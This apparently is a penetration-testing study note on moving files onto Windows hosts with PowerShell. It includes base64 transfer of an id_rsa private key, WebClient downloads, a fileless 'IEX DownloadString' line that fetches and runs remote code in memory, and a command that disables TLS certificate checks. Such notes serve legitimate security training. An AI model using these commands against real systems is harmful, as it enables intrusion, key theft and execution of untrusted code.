
#### PowerShell Base64 Encode & Decode
---
Depending on the size of the payload, we can encode the file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.

An essential step using this method is to ensure the file we encoded and decoded is correct. We can use md5sum to verify the checksum.

```bash
cat id_rsa |base64 -w 0;echo
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<string>")
```

Confirm the MD5 hash

```Powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

***Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.*


### PowerShell Web Downloads
---
Most companies allow HTTP and HTTPS traffic through the firewall. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

##### PowerShell DownloadFile Method
------
We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

`DownloadFile`: Downloads data from a resource to a file.
```powershell
(New-Object Net.WebClient).DownloadFile('<target-url','<output-file')
```

`DownloadFileAsync`: Downloads data from a resource to a local file without blocking the calling thread.
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<target-url','<output-file')
```

##### PowerShell DownloadString - Fileless Method
----
Fileless attacks work by using some OS function to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the `Invoke-Expression` cmdlet or the alias `IEX`.

```powershell
IEX (New-Object Net.WebClient).DownloadString('<target-url')
```

`IEX` also accepts pipeline input
```powershell
(New-Object Net.WebClient).DownloadString('<target-url') | IEX
```

##### PowerShell Invoke-WebRequest
---
From PowerShell 3.0 onwards, the `Invoke-WebRequest` cmdlet is also available. You can use the aliases `iwr`, `curl` and `wget` instead of the full name.
```powershell
Invoke-WebRequest <target-url> -OutFile <output-file>
```

##### Common Errors with PowerShell
---
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter `-UseBasicParsing`.

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```